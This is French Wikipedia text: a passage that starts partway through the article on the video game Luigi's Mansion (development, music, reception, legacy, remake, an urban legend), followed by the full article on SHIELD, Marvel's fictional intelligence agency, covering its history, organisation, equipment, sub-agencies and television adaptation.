À l'origine prévu sur le 64DD de la Nintendo 64, le jeu est finalement présenté au Nintendo Space World en 2000 sous forme de démo technique visant à montrer les capacités graphiques de la GameCube. La vidéo devait faire la promotion et aussi la bande-annonce du jeu mais n'a jamais été utilisée. Dans la vidéo, on pouvait voir Luigi courir après un fantôme dans le hall, d'autres jouant aux cartes dans le salon, et d'autres tournant autour de Luigi, mais cela n'est jamais apparu dans la version finale du jeu. Peu de temps après sa création, Nintendo décide d'en faire un jeu complet. est ensuite présenté à l'E3 2001 avec la console GameCube. Une nouvelle version du jeu, plus proche de la version finale, est présentée au Nintendo Space World 2001.
Satoru Iwata, PDG de Nintendo, affirme dans une "interview" publiée sur le site officiel de l'entreprise que la GameCube possède un disposif d'autostéréoscopie, semblable à celui qu'aura la Nintendo 3DS des années plus tard, pouvant produire des images en relief sans dispositif spécifique et qu'une version en 3D relief de "Luigi's Mansion" a été développée. Le projet a été abandonné avant la sortie de la console à cause du coût trop élevé de l'écran LCD spécifique à la console prévu pour faire fonctionner cette technologie.
Les développeurs commencent à travailler sur . Ils commencent à imaginer un jeu où il faut compléter des niveaux disposés autour d'un large manoir. Ils font des essais avec plusieurs personnages de l'univers Mario dans des maisons de poupées. Le jeu devient ensuite un projet pour la GameCube et choisissent Luigi comme personnage principal pour le rendre original. Les développeurs ont quelques idées comme de pouvoir aspirer un fantôme avec un aspirateur. Ils essaient également de se rapprocher d'un jeu vidéo de rôle dans lequel on se déplace en temps réel entre les différentes pièces.
La musique de a été composée par Shinobu Tanaka et Kazumi Totaka, et y figure la , une chanson présente dans chaque jeu où Totaka a participé. On l'entend quand on attend sur la configuration de l'écran dans la salle d'entraînement pendant trois minutes et demie. Le thème principal de "Super Mario Bros." peut être joué dans le conservatoire. Le thème principal du jeu est orchestré par Shogo Sakai pour "Super Smash Bros. Brawl". Charles Martinet double la voix de Mario et Luigi tandis que Jen Taylor double celle de Toad. reçoit un prix de la part de BAFTA Interactive Entertainment Awards en 2002 pour la qualité de sa bande son.
Accueil.
 est le jeu de lancement de la GameCube qui a reçu le plus de succès et est le troisième jeu le plus vendu en . Le jeu s'est vendu à au Japon et aux États-Unis et est le cinquième jeu GameCube le plus vendu aux États-Unis. Il est l'un des premiers jeux ayant reçu le label Choix des Joueurs, en même temps que "Super Smash Bros. Melee" et "Pikmin".
 reçoit un accueil plutôt favorable et les critiques louent les graphismes du jeu, son design et le système de jeu. GameSpot apprécie beaucoup les idées qu'ont eu les développeurs de . Le magazine "Nintendo Power" fait l'éloge du jeu et particulièrement de son "gameplay", jugé innovant. Gamekult trouve qu'il est amusant et estime que les visuels et animations sont proches du dessin animé. "GamePro" le considère comme un . Game Revolution est très satisfait des graphismes et des mécanismes de jeu. Jeuxvideo.com lui donne un 15/20, estimant qu'il est . IGN apprécie la voix de Luigi et la bande son, tandis que Gamekult la trouve . Le magazine japonais "Famitsu" attribue une bonne note au jeu, précisant que les contrôles, assez compliqués au début, fonctionnent bien.
Le jeu reçoit également des critiques négatives, principalement à cause de sa durée de vie jugée trop faible. GameSpot mentionne que et qu'il faut . La critique estime que cette courte longévité permet au système de jeu et à la musique de ne pas devenir trop lassants alors que Gamekult trouve le jeu répétitif. Jeuxvideo.com reproche également et est aussi déçu par . AllGame déclare qu'à long terme, . Matt Casamassina d'IGN trouve le jeu médiocre, à cause de son système de jeu prévisible. L'émission ' critique , dans un épisode sur les mauvais jeux Mario, en estimant que c'est une déception pour les joueurs qui s'attendaient à mieux pour le premier jeu Mario sur GameCube. Le jeu est situé à la du classement des 100 meilleurs jeux de Nintendo dressé par lOfficial Nintendo Magazine".
Postérité.
Utilisation de l'univers.
Le professeur Karl « K. » Tastroff fait ses débuts dans ce jeu et est depuis devenu un personnage récurrent de l'univers de Mario. C'est l'inventeur de J.E.T., la pompe à eau de Mario, et du pinceau magique de Bowser Jr. dans "Super Mario Sunshine". Il a également crée une machine spatiotemporelle dans "."
Le Roi Boo apparait en tant que personnage jouable dans la série "Mario Kart", notamment dans "", "Mario Kart Wii" et "Mario Kart 8 Deluxe", mais aussi en tant que boss de "Super Princess Peach", "Super Mario 64 DS", "Super Mario Sunshine" et de "Luigi's Mansion 2".
Depuis la sortie du jeu, le manoir est devenu un lieu emblématique, à la manière du Château de Peach de "Super Mario 64". Le manoir réapparait fréquemment dans des jeux des séries "Mario" tels que "Mario Kart" en tant que circuit et arène pour les batailles, dans les "Mario Tennis" en tant que terrain de tennis et les "Super Smash Bros." en tant que zone de combat, renommé sous le nom de Manoir de Luigi.
Le jeu "Nintendo Land" propose un mini-jeu intitulé "Luigi et le manoir hanté", inspiré de "Luigi's Mansion".
Suites.
Une suite intitulée "Luigi's Mansion 2" en Europe, ou "Luigi's Mansion: Dark Moon" en Amérique du Nord, est sortie en 2013 sur Nintendo 3DS. Un troisième opus, "Luigi's Mansion 3", est sorti sur Nintendo Switch en 2019.
Remake.
Dix-sept ans après la sortie du premier opus, Nintendo annonce le un remake sur Nintendo 3DS. Le jeu est sorti le en Amérique du Nord, le en Europe et le au Japon. Il comprend un nouveau mode, Boss Rush, dans lequel le joueur affronte les boss qu'il a déjà battus dans l'aventure principale. De plus, il propose un mode multijoueur en coopération avec Gluigi dans lequel deux joueurs peuvent accomplir l'aventure principale ensemble. Le jeu est compatible avec des amiibo. L'Ectochien et le Spectroflash sont disponibles comme dans le deuxième opus.
Légende urbaine : Hanging Luigi Shadow.
Après le combat contre Boolossus, la salle des téléphones devient accessible au troisième étage. Lorsque Luigi répond au téléphone du milieu et qu'un éclair tombe, une ombre surélevée est projetée sur le mur. La légende urbaine selon laquelle il s'agit de l'ombre de Luigi pendu au plafond est extrêmement populaire sur Internet et est le sujet de nombreuses vidéos ou posts Reddit. Selon cette légende, les événements du jeu se passerait après la mort de Luigi et il s'agirait d'un easter egg intégré volontairement au jeu par les développeurs.En réalité, il s'agit d'un simple bug lié au système d'éclairage du jeu. Le bug n'existe pas dans le remake 3DS.

</doc>
<doc id="248586" url="https://fr.wikipedia.org/wiki?curid=248586" title="SHIELD">
SHIELD

Le SHIELD (typographié « S.H.I.E.L.D. » en ) est une agence de renseignement, d'intervention et de contre-terrorisme de fiction appartenant à l'univers Marvel de la maison d'édition Marvel Comics. Créée par le scénariste Stan Lee et le dessinateur Jack Kirby, l'organisation apparaît pour la première fois dans le comic book "Strange Tales" #135 en août 1965.
Dirigé à l'origine par Nick Fury (personnage créé en 1963), un vétéran de la Seconde Guerre mondiale et super-espion borgne, celui-ci en est le directeur historique même si le commandement a été assuré pendant quelque temps par G. W. Bridge. À la suite de sa contre la Latvérie, Fury disparaît de la circulation.
L'organisation est ensuite dirigée par Maria Hill jusqu'aux événements de "Civil War". Tony Stark lui succède jusqu'à la dissolution de l'agence, après les événements de "Secret Invasion".
Conception.
À propos du nom.
Le nom original « S.H.I.E.L.D. », signifiant « bouclier » en anglais, a été parfois traduit par MIESL (Arédit) ou SERVO (Humanoïdes Associés).
Dans la version française du film "Iron Man", SHIELD signifie le bureau « Stratégique Habileté Intervention Exécution et Logistique Défensive ».
Inspiration.
Cette agence a été inspirée par les rumeurs nées du folklore américain affirmant l'existence d'une agence d'espionnage travaillant pour les Nations unies. Dans la réalité, si l'ONU dispose d'une « Cellule d’Analyse Interforces » comme service de renseignement, elle a un pouvoir infime en comparaison des agences nationales, alors que le SHIELD a une autorité supranationale.
Historique fictionnel.
Origines.
Le SHIELD a été créé par l'industriel Howard Stark à la fin de la Seconde Guerre mondiale pour remplacer la Section Scientifique de Réserve (SSR), au départ comme une simple agence de contre-espionnage pour maintenir la paix, mais Stark abandonne le projet car le gouvernement américain n'est pas convaincu. Pourtant, un comité des Nations unies ressort discrètement le projet du placard, intégrant Nick Fury en tant que directeur des opérations (directeur adjoint, ou deuxième dans l'organisation).
Fondé à la suite de la victoire des Alliés sur les puissances de l'Axe et d'HYDRA pendant la Seconde Guerre mondiale, le SHIELD est organisé pour protéger les États-Unis de toutes les menaces extérieures possibles. Avec ses armes de pointe et ses agents spéciaux, le SHIELD était alors peut-être la plus grande puissance militaire de la Terre. Après sa rencontre avec Captain Marvel, le SHIELD est dirigé par Nick Fury et le Conseil de sécurité des Nations unies.
Peu après la guerre, dans le cadre de l'opération Paperclip, le SHIELD recrute les scientifiques de l'Allemagne nazie pour éviter que leur expertise ne tombe entre les mains de l'Union soviétique. Le tristement célèbre Arnim Zola fait partie des scientifiques recrutés, mais il utilise sa nouvelle position pour reconstruire secrètement l'HYDRA. Sans que personne le soupçonne, HYDRA se développe secrètement au sein du SHIELD, orchestrant de nombreuses crises nationales et internationales au cours des décennies suivantes.
Au fil des ans, Alexander Pierce, l'un des membres les plus haut placés du SHIELD et secrétaire à la Défense, est persuadé de rejoindre HYDRA. Plus tard, il rencontre le colonel Nick Fury, un officier distingué de l'armée américaine et vétéran de l'espionnage de la guerre froide, et le persuade de rejoindre l'agence.
En 1989, Alexander Pierce accorde à Werner Reinhardt une libération conditionnelle pour raisons médicales de sa condamnation à perpétuité dans le Raft et permet au général d'HYDRA de retourner en Autriche. Lorsque Howard Stark devient suspect, lui et sa femme Maria sont tués dans un « accident » de voiture, secrètement organisé par HYDRA sur l'île de Long Island en 1991.
Développement.
Dans les années 1960, l'organisation du SHIELD devient une agence de renseignement très bien équipée et sous la juridiction de l'organisation des Nations unies (ONU). La sécurité du siège des Nations unies à New-York dépend de la seule juridiction du SHIELD, ses forces pouvant être employées comme une force de maintien de la paix des Nations unies.
Deux scientifiques du SHIELD, Hank Pym et Bill Foster, coopèrent dans le cadre du projet G.O.L.I.A.T.H. où ils expérimentent les particules créées par Pym afin d'augmenter leur masse corporelle. Foster est capable d'atteindre une taille maximale de vingt et un pieds. Cependant, il décide de quitter le projet et celui-ci est rapidement abandonné à la suite de la démission de Pym du SHIELD.
À l'époque, le SHIELD possède entre autres un mini-héliporteur (base mobile volante) nommé le « Behemoth ». C'est aussi elle qui développe la technologie des LMD (les ou « Simulacre de vie modélisée » en français), des androïdes qui sont les copies conformes d'une personne. Certains furent utilisés contre le SHIELD, remplaçant des membres importants, jusqu'à ce que Fury ne découvre l'infiltration organisée par le Zodiaque.
Dans le cadre de ses activités, le SHIELD est chargé dans les années 1970 de stopper Godzilla et construit dans ce but un robot géant, nommé .
Période récente.
À l'ère moderne, le SHIELD fait face à l'augmentation significative du nombre d'individus améliorés (ceux avec des super-pouvoirs), de technologies avancées dangereuses et de contacts avec des races intelligentes extraterrestres.
L'agence devient publiquement connue après la bataille de New York, en partie grâce au site web de Rising Tide.
"Secret War".
À la suite de "", une opération secrète menée par le SHIELD en Latvérie dans les années 1990, Nick Fury quitte son poste de directeur de l'organisation. C'est la jeune américaine Maria Hill, jugée neutre vis-à-vis des super-héros mais toutefois patriote, qui prend alors sa place.
En 1995, les agents Nick Fury et Phil Coulson sont envoyés pour enquêter sur une femme mystérieuse qui s'est apparemment écrasée sur Terre. Cette femme prétendait être Vers, une guerrière Kree qui tentait d'empêcher les Skrulls métamorphes de s'emparer de la planète. Fury rencontre quelques Skrulls après avoir suivi Vers à la poursuite de l'un d'entre eux, et tue un Skrull qui se faisait passer pour Coulson.
Fury retrouve Vers et, ensemble, ils apprennent son origine sur Terre en tant que pilote qui avait aidé le Kree Mar-Vell à tester un moteur supraluminique. Cependant, ils doivent fuir le Skrull Talos qui se fait passer pour le directeur R. Keller. Fury et Vers rendent visite à Maria Rambeau, une amie de Vers à l'époque celle-ci était sur Terre, qui l'aide à apprendre son vrai nom, Carol Danvers.
Le Skrull Talos les retrouve mais révèle qu'il veut seulement trouver un nouveau foyer pour son peuple, et que l'armée Kree est à la recherche de la source du moteur supraluminique. Fury, Danvers, Rambeau, Talos et le Flerken Goose s'envolent alors vers le laboratoire de Mar-Vell dans l'espace, où ils trouvent la source du moteur supraluminique, le Tesseract et le peuple de Talos. Cependant, les Kree les retrouvent, et pendant que Danvers combat leur armée, Fury et les autres retournent sur Terre avec le Tesseract et les Skrulls. Danvers finit par faire reculer les Kree.
Danvers demande à Fury de garder le Tesseract pendant qu'elle recherche un nouveau foyer pour les Skrulls et essaye de mettre fin à la guerre Kree-Skrull. Avant de partir, elle rend à Fury son pager transmetteur, désormais capable d'appeler Danvers sur des galaxies de distance en cas d'urgence.
"Civil War".
Lors du crossover "Civil War", le SHIELD fait la chasse aux super-héros rebelles. Tous ceux qui signent la loi d'enregistrement « "" » se retrouvent soumis aux ordres du directeur du SHIELD.
À la fin du conflit, Maria Hill, se sentant piégée par le gouvernement, offre son poste à Tony Stark (Iron Man) ; elle reste toutefois son assistante. Stark accepte de lui succéder et fait construire un second héliporteur du SHIELD, aux couleurs d'Iron Man, et ajoute même une boite à suggestions. Il explique à Hill qu'il n'aimait pas l'ancien héliporteur parce qu'il « sentait trop le cigare » à son goût (Fury était un grand amateur de cigares). Stark met aussi en place le programme Initiative, visant à ce que chaque État des États-Unis soit protégé par une équipe de super-héros agréés par le gouvernement.
Dissolution du SHIELD par Norman Osborn.
N'ayant pas pu prévenir la l’invasion secrète qui a vu les extraterrestres Skrull s'infiltrer dans les principales organisations de la Terre et détourner la technologie de Stark industries, Tony Stark est renvoyé par le président Ellis Matthew qui nomme Norman Osborn directeur d'une nouvelle agence, le HAMMER, qui intègre les infrastructures du SHIELD.
Osborn dissout l'agence et renvoie les agents du SHIELD. Une partie de ceux-ci rejoint Nick Fury, qui utilise toujours pour ses opérations les installations secrètes du SHIELD que la nouvelle direction du HAMMER ne connaît pas.
Les agissements criminels de Norman Osborn ayant été révélés au monde lors de sa tentative d'invasion d'Asgard, le gouvernement américain se rend compte de son erreur et l'accuse de haute trahison, et le renvoie.
Recréation par Steve Rogers.
Le HAMMER est à son tour dissous, tandis que Steve Rogers (Captain America) est nommé à la tête de l’Initiative et de la communauté héroïque à la place de Norman Osborn. Rogers préfère alors ne pas recréer le SHIELD, se limitant à constituer une équipe de Vengeurs secrets afin de pouvoir mener des opérations secrètes si nécessaires.
Quand Osborn réapparaît à la tête d’un nouveau HAMMER et de nouveaux Dark Avengers, maintenant alliés non seulement à l'HYDRA mais aussi à l’AIM, Steve Rogers décide de recréer le SHIELD et recrute certains de ses anciens agents avec de nouveaux, et occupe à son tour le poste de directeur. Le nouveau SHIELD demeure sous la direction de Rogers jusqu’à ce que celui-ci reprenne son identité de Captain America, cédant alors la place à la jeune Daisy Johnson.
Poursuite avec Daisy Johnson et retour de Maria Hill.
Sous la direction de Daisy Johnson, le SHIELD et les Vengeurs se rapprochent et Steve Rogers créée, entre autres, les Secret Avengers, une équipe chargés d’opérations secrètes en lien avec les activités du SHIELD.
L’organisation se retrouve bientôt en opposition avec l’AIM, désormais dirigé par Andrew Forson, qui réussit à obtenir pour son organisation criminelle un statut d’État indépendant au sein des Nations unies.
Les échecs successifs du SHIELD sous l’ère Johnson conduisent finalement à sa destitution à la tête de l’agence, au profit de Maria Hill, qui renoue rapidement avec les Vengeurs de Steve Rogers afin que les deux groupes continuent d'œuvrer main dans la main.
Organisation.
Quartier général et bases.
Le quartier général (QG) du SHIELD est à l'origine une base volante appelée « héliporteur du SHIELD » (« » en ). Ce vaisseau aérien (schématiquement, une sorte de « porte-avions volant ») a été conçu pour disposer d’une source d’énergie indépendante et une capacité de vol illimitée, en plus des fonctions standard de tout appareil aérien. Voir la section « Équipement » pour plus de détails sur l'héliporteur.
Bien que les différents héliporteurs construits au fil des ans aient longtemps été considérés comme la principale base mobile du SHIELD, le Directoire possède également un certain nombre de bases terrestres à travers le monde, notamment le « SHIELD Central » à New York. Bien que certaines de ces bases soient accessibles au public sur une base limitée, la plupart ne sont pas divulguées publiquement, pour des raisons de sécurité planétaire.
Il existe plusieurs bases du SHIELD entièrement équipés d'abris anti-atomiques et qui sont disséminés dans le monde, vingt-huit d'entre elles n'étant connues que de Nick Fury. Pendant les événements de la guerre civile, Nick Fury se cachait dans l'une de ses bases, située aux États-Unis. Il a également divulgué l'emplacement de l'une d’entre-elles à Captain America, afin que le groupe de résistance à la loi d’enregistrement des surhumains qu'il menait puisse l'utiliser comme lieu sûr.
Actuellement, les bases d’opérations du SHIELD comprennent un héliporteur mobile ainsi que diverses bases terrestres et héliporteurs, disposés à différents endroits du globe : en Allemagne, au Brésil, au Canada, en Égypte, aux États-Unis (notamment le Central SHIELD à New York), en France, Grèce, Inde, Italie, Mexique, Pérou et en république démocratique du Congo.
Le SHIELD dispose également de bases non terrestres, dont une station spatiale en orbite autour de la Terre et une autre sur la Zone bleue de la Lune.
Niveaux d'accréditations.
L’organisation du SHIELD posséde à l'origine 10 niveaux d'accréditations, ainsi que les niveaux « Alpha », « Omega » et « Tango ».
À mesure que les agents du SHIELD progresse au delà du niveau 1, ils ont accès à plus d’informations et, le plus souvent, à plus de pouvoir même si le rang et le niveau d’autorisation ne sont pas nécessairement corrélés. Par exemple, pour que les agents connaissent toutes les informations concernant la bataille de New York, ils doivent être de niveau 7. Le niveau d'habilitation d'un agent n'est pas basé sur la durée de son appartenance à l'agence, mais principalement sur ses performances.
Au niveau interne, les accréditations des agents du SHIELD dépendent d'un code allant de 1 à 10, donnant accès à l'équipement, aux informations et aux renseignements secrets correspondants :
Personnel.
Directeurs.
Le SHIELD a été dirigé (dans les comics) successivement par :
Agents.
Le SHIELD compte, ou a compté, parmi ses agents (dans les comics) :
Formation.
L'Académie des sciences et technologies (souvent abrégée en Sci-Tech) est une division de l’Académie du SHIELD qui forme des spécialistes en sciences et technologie.
L'Académie des opérations est une division du SHIELD qui forme des spécialistes et des agents de terrain, généralement envoyés ensuite dans les divisions tactiques comme le STRIKE.
L'Académie des communications est une division du SHIELD qui forme des spécialistes en technologies de communications. Généralement, des techniciens ou des ingénieurs sortent de cette académie.
Équipement.
Armement.
Les agents réguliers du SHIELD sur le terrain sont généralement équipés d'un pistolet de calibre 9 mm, habituellement un Glock 17 ou plus récemment un Smith &amp; Wesson M&amp;P. Une branche militaire du SHIELD utilisée pour la sécurité lourde a aussi accès à des armes personnelles de niveau militaire. Quelques agents d’élite sélectionnés portent également des armes moins classiques, telles que des explosifs ou des arcs.
Le projet du SHIELD intitulé « Phase 2 » a été consacré à faire progresser la technologie des armes et à analyser les armes à énergie dirigée extraterrestres.
Véhicules.
L'héliporteur du SHIELD.
L’héliporteur du SHIELD (« » en ) est une plateforme aérienne (base d’opérations mobile) apparue pour la première fois (dans sa première version) dans le comic book "Fury" #1 en mai 1994, créé par Barry Dutter et M. C. Wyman. En France, il apparaît dans "Strange Spécial Origines" 312 en août 1996.
Spécifiquement conçu afin de disposer d’une source d’énergie indépendante et d’une capacité de vol illimitée, en complément des fonctions conventionnelles à tout appareil aérien, les différents modèles de l'héliporteur sont la propriété exclusive du SHIELD.
Dans les comics, l’héliporteur a été conçu par Tony Stark (avec Stark Industries) allié à Red Richards, et a ensuite été amélioré par Forge.
L’héliporteur, en plus de contenir des vaisseaux volants (comme un porte-avions traditionnel), est lui-même équipé de plusieurs armements. Il comprend notamment un ensemble de canons antiaériens, dotés de projectiles allant des obus de à un arsenal nucléaire. Il est aussi équipé d’armements plus exotiques, notamment des systèmes de défense antimissile, des missiles à tête chercheuse de radiations ou à infrarouge, des générateurs de singularité quantique, de la « Corne du Diable » et un arsenal anti-radiations. L’héliporteur peut aussi générer un champ de force protecteur autour de ses systèmes vitaux, afin de se protéger des attaques.
Autres.
Le SHIELD maintient des flottes de véhicules de marques Acura et Lexus pour le déploiement régulier sur le terrain de ses agents et scientifiques. Il dispose notamment d'éditions personnalisées des modèles Acura MDX, Acura TL, Acura ZDX, Lexus GS 350, Lexus GX 460 et Lexus IS peints en noir, portant le sceau du SHIELD et équipés d'une technologie de surveillance sophistiquée.
Le bras armé du SHIELD utilise une gamme de véhicules adaptés pour la sécurité urbaine, ainsi que des avions dotés de capacités de combat qui comprennent des hélicoptères et des avions de chasse. Cette branche a aussi accès à des types d’appareils exclusifs.
Agences tierces.
Le SHIELD possède aussi des sous-agences, aux missions bien précises.
STRIKE.
Le STRIKE (« Special Tactical Reserve for International Key Emergencies » ; en français « Réserve tactique spéciale pour les urgences clés internationales ») est une agence proche du SHIELD basée en Angleterre. Elle apparaît pour la première fois dans le comic book "Captain Britain" #17 en février 1977.
Le STRIKE est également connu pour avoir eu comme membre la mutante Betsy Braddock, alias Psylocke. Cependant, l'organisation a été infiltrée par des espions, ce qui a conduit à des complications et à la séparation de Psylocke de l'agence.
Dans l'univers cinématographique Marvel (MCU), le STRIKE a également fait des apparitions : dans le film ', le personnage de Brock Rumlow est membre du STRIKE et joue un rôle important dans l'intrigue. Dans la série télévisée ', le STRIKE est présenté comme l'unité d'intervention antiterroriste du SHIELD. Dans cette série, le STRIKE est souvent mentionné en relation avec des opérations spéciales et missions à haut risque.
SWORD.
Le SWORD (« Sentient World Observation &amp; Response Department » ; en français « Département de réponse à l'observation du monde sensible ») est une agence spécialisée dans la surveillance et la réponse aux menaces extraterrestres. Elle est souvent associée à l'équipe des X-Men. Créée par le scénariste Joss Whedon et le dessinateur John Cassaday, l'agence apparaît pour la première fois dans le comic book "Astonishing X-Men" () #6 en décembre 2004.
Le SWORD est présenté comme une agence-sœur du SHIELD qui se concentre sur les menaces provenant de l'espace, le SHIELD se concentrant lui principalement sur les menaces terrestres. L'agent Phil Coulson en est le responsable durant les comics book "Daisy Johnson" #3.
Depuis lors, le SWORD est devenu un élément récurrent de l'univers Marvel, apparaissant dans de nombreuses séries de comics, ainsi que dans d'autres médias comme les dessins animés, les jeux vidéo et les films.
Au sein de l'univers cinématographique Marvel, elle joue un rôle important dans la série télévisée "WandaVision".
SAFE.
Le SAFE (« Strategic Action For Emergencies » ; en français « Action stratégique pour les urgences ») est une unité d'intervention spécialisée opérant sous l'égide du SHIELD. Son mandat principal est la gestion des situations de crise et des menaces graves pour la Sécurité nationale et internationale, requérant des actions tactiques immédiates et précises.
Les membres du SAFE sont sélectionnés parmi les agents hautement qualifiés du SHIELD, choisis pour leurs compétences exceptionnelles, leur expérience opérationnelle et leur aptitude à travailler sous la pression. Avant d'intégrer l'unité, ces agents subissent une formation intensive couvrant divers domaines, notamment les tactiques d'intervention, la négociation de crise, le tir de précision et la gestion du stress.
Le SAFE est équipé pour intervenir rapidement et efficacement dans des scénarios critiques tels que les prises d'otages, les attaques terroristes et les situations d'individus barricadés. Leurs tactiques d'intervention reposent sur une combinaison de compétences techniques avancées et de coordination stratégique, visant à minimiser les risques pour les otages et à neutraliser les menaces avec précision.
Le SAFE travaille en étroite collaboration avec d'autres unités du SHIELD, en raison de sa similarité avec le STRIKE.
EuroM.I.N.D.
L'EuroM.I.N.D. (« European Monitoring Investigation and Enforcement Division » ; en français « Division européenne de surveillance, d'enquête et d'application ») est la branche européenne du SHIELD chargée de surveiller, enquêter et faire respecter la loi sur le territoire européen. Elle travaille en étroite collaboration avec les autres divisions du SHIELD ainsi qu'avec les agences de sécurité nationales des pays membres de l'Union européenne.
EuroM.I.N.D. est dotée de ressources et de technologies avancées pour surveiller les menaces potentielles et répondre rapidement aux situations d'urgence.
Après un certain temps, EuroM.I.N.D. est placée sous le contrôle du conseil SHAPE (Supreme Headquarters Allied Powers Europe), ce qui renforce sa coordination avec les forces de sécurité européennes.
STAKE.
Le STAKE est une division spécialisée du SHIELD qui se concentre sur les phénomènes surnaturels et les menaces d'origine paranormale.
Ses agents sont formés pour enquêter sur les activités anormales, analyser les risques associés et élaborer des stratégies pour neutraliser les menaces. Ils travaillent souvent en collaboration avec des experts en occultisme, des scientifiques spécialisés dans les sciences paranormales et des praticiens de la magie afin de mieux comprendre et contrer les forces mystiques qui pourraient mettre en danger la sécurité mondiale.
WAND.
Le WAND (« Wizardry, Alchemy and Necromancy Department ») est une division du SHIELD qui se concentre spécifiquement sur les questions liées à la magie, à l'alchimie et à la nécromancie.
Ses agents sont formés pour identifier, surveiller et contrôler les utilisateurs de magie, ainsi que pour enquêter sur les artefacts magiques potentiellement dangereux. Ils sont souvent confrontés à des menaces ésotériques et doivent utiliser leurs connaissances spécialisées pour contrer les rituels malveillants, les sorts destructeurs et les entités démoniaques. WAND joue un rôle crucial dans la protection du monde contre les forces occultes et les dangers mystiques.
DODC.
Le DODC (« U.S. Departement Of » ; en français « Département américain du contrôle des dommages ») est une agence américaine de construction spécialisée dans la réparation des dommages matériels causés par les conflits entre super-héros et super-vilains. Elle apparaît pour la première fois dans le comic book "Marvel Age Annual" #4 en juin 1988.
Crée par Tony Stark (avec sa société Stark Industries), l’agence est chargée de gérer et réparer les dégâts d'autres incidents impliquant des éléments extranormaux, pour la censure et éviter la propagation de scandales internationaux.
Elle a agi durant le conflit opposant les Vengeurs aux forces de Thanos.
Versions alternatives.
HATE.
Le HATE (« Highest Anti Terrorism Effort ») est une version alternative et parodique du STRIKE créée par le scénariste Warren Ellis pour la série limitée "Nextwave: Agents of H.A.T.E.", pubiée en 2006-2007.
Il s'agit d'une agence gouvernementale qui n'est pas directement liée au SHIELD dans le canon principal des comics Marvel. Le chef du HATE (la HAINE en ), le général Dirk Anger, est une parodie de Nick Fury. Cette série représente le HATE comme étant une organisation secrète aux motivations suspectes, dirigée par le fou Anger qui a des problèmes de maîtrise de soi et de sexualité.
Bibliographie sélective.
Le SHIELD apparaît dans de nombreuses séries de Marvel Comics. Ces membres étant des agents secrets d'un type similaire à ceux de la CIA, ils doivent être informés de tous les problèmes se passant sur la Terre-616, même s'ils n'interviennent pas :
Équipes artistiques.
Jim Steranko, Joe Sinnott, Bob Hall, Bob Harras, Barry Windsor-Smith, Steve Parkhouse, Tom DeFalco, Mark Millar, Steve McNiven, Don Hudson, Gregory Wright, John Heebink, Bill Sienkiewicz, Garth Ennis, Jimmy Palmiotti, Rob Liefeld, Fabian Nicieza, Mike Norton, Keith Giffen, Brian Michael Bendis, Gabriele Dell'Otto, Jonathan Hickman, Dustin Weaver, Marc Silvestri, Leinil Francis Yu, Sunny Gho
Apparitions dans d’autres médias.
Télévision.
Historique fictionnel dans "Marvel : Les Agents du SHIELD".
Dans la série ", en 2014, grâce aux actions de la Veuve noire et Nick Fury, le monde a pris conscience du fait que le SHIELD était infiltré et largement contrôlé par l'HYDRA.
Après la bataille au cours de laquelle le siège principal du SHIELD le Triskèle, a été gravement endommagé, tous les dossiers classifiés du SHIELD ont été publiés sur Internet, et l'agence a été désavouée par le gouvernement des États-Unis et qualifiée d'organisation terroriste.
De nombreux fonctionnaires du SHIELD ont été placés en détention et soumis à un interrogatoire rigoureux. Cependant, malgré la chasse massive aux agents du SHIELD quelques agents dispersés à travers le monde dans la plupart des bases secrètes sont restés fidèles à leur serment, sauvegardant les technologies les plus nécessaires pour un usage futur. Mais l'équipe la plus responsable de la survie du SHIELD est celle de l'agent Phil Coulson, qui a vaillamment mené ses coéquipiers contre les forces d'HYDRA dirigées par les traîtres John Garrett et Grant Ward, remportant la bataille au cours de laquelle le plan de Garrett a finalement échoué. Après cette bataille, Fury nomma Phil Coulson nouveau directeur du SHIELD et le chargea de reconstruire l'agence à partir de zéro, en devenant une agence parapolicière de l'ombre.
Le SHIELD a dû faire face aux conséquences de l'épidémie inhumaine. Après l'exposition et la fin abrupte de l'infiltration de l'ATCU par HYDRA, le SHIELD a été semi-légalisé en tant que division d'opérations secrètes de l'administration de Matthew Ellis, l'ATCU servant de visage public au SHIELD. HYDRA ayant subi un coup dur, le SHIELD a découvert l'existence de l'Inhumain noir, Hive, et a rapidement dû se battre contre son armée d'Inhumains, qui voulait transformer toute l'humanité en Inhumains. Alors que la guerre contre Hive touche à sa fin, Lincoln Campbell sacrifie sa vie pour détruire Hive lors d'une explosion nucléaire dans l'espace.
Après la défaite de Hive, le SHIELD est à nouveau légalisé à la suite de la signature des accords de Sokovie, mais sous la direction d'un nouveau directeur, Jeffrey Mace. Daisy Johnson abandonne le SHIELD et devient une justicière connue sous le nom de Quake. Dans le même temps, ils doivent faire face à de nouvelles menaces, Eli Morrow, qui, grâce à la connaissance du mystérieux livre appelé le Darkhold, a réussi à acquérir d'incroyables pouvoirs. Pour le vaincre, S.H.I.E.L.D. a travaillé avec Johnson et le Ghost Rider. Après la victoire sur Morrow, Johnson rejoint l'organisation. La révélation que Mace n'était pas un Inhumain a poussé Coulson à reprendre possession des lieux en tant que directeur de facto. À la suite de la trahison de Holden Radcliffe pour les Chiens de garde et au remplacement de presque tous les agents clés par un LMD de sa part, les agents Johnson et Jemma Simmons sont entrés dans la Charpente afin de sauver leurs amis disparus. Malgré le succès de l'opération, ils durent bientôt faire face à Aida, devenue un Inhumain cherchant à détruire le SHIELD. Avec l'aide du Ghost Rider, ils la tuèrent, mais cela provoqua la fermeture de l'organisation, car Aida et le Supérieur réussirent à faire accuser Johnson de la tentative d'assassinat de Glenn Talbot.
Peu de temps après, un Chronicom nommé Enoch envoya l'équipe, à l'exception de Leo Fitz, en 2091 pour accomplir une prophétie. Ils se sont retrouvés dans le bunker Lighthouse, peuplé du reste de la race humaine, à la suite d'un événement catastrophique qui a causé la destruction de la Terre. Pour survivre, l'équipe a dû se fondre parmi les humains et combattre les Kree, qui régnaient sur les lieux sous les ordres de Kasius, tout en trouvant un moyen de retourner dans le présent. Ils ont finalement réussi à revenir, rejoignant les agents ralliés par Deathlok et entamant une course contre la montre pour empêcher la destruction de la Terre. Après avoir combattu HYDRA dirigé par Hale, la Confédération et Glenn Talbot, le SHIELD changé le cours de l'histoire et sauvé la Terre. Cependant, Fitz est mort au cours du processus. Coulson étant mourant, Melinda May et lui quittèrent le SHIELD pour passer du temps ensemble jusqu'à sa mort, et Mackenzie reprit le flambeau de directeur. Les agents restants du SHIELD partent alors en mission pour retrouver la version actuelle de Fitz, qui a été congelé en animation suspendue dans l'espace.
